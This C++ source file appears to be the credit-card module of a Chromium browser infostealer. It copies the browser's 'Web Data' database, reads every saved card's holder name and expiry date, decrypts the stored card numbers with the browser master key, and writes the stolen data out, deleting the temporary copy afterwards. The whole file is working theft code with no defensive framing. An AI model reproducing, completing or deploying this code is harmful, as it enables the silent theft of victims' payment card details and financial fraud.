//
// Created by .1qxz on 08.06.2024.
//

#include "CCreditCards.h"

void CCreditCards::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Web Data";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<std::unique_ptr<Entity>> cards;

    SQLiteUtil::connectAndRead(R"(
            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted
            FROM credit_cards
            ORDER BY use_count DESC
    )", copied_db, [this, &cards](sqlite3_stmt *stmt) {

        auto creditCard = std::make_unique<CreditCard>();
        creditCard->name_on_card = SQLiteUtil::readString(stmt, 0);
        creditCard->expiration_month = SQLiteUtil::readInt(stmt, 1);
        creditCard->expiration_year = SQLiteUtil::readInt(stmt, 2);

        std::vector<BYTE> master_key = this->getMasterKey();

        std::string decoded_card_number = ChromiumUtil::decryptData(SQLiteUtil::readBytes(stmt, 3), master_key);
        creditCard->card_number = decoded_card_number;

        cards.push_back(std::move(creditCard));
    });

    fs::remove(copied_db);
    Entity::writeSelf(root, cards);
}
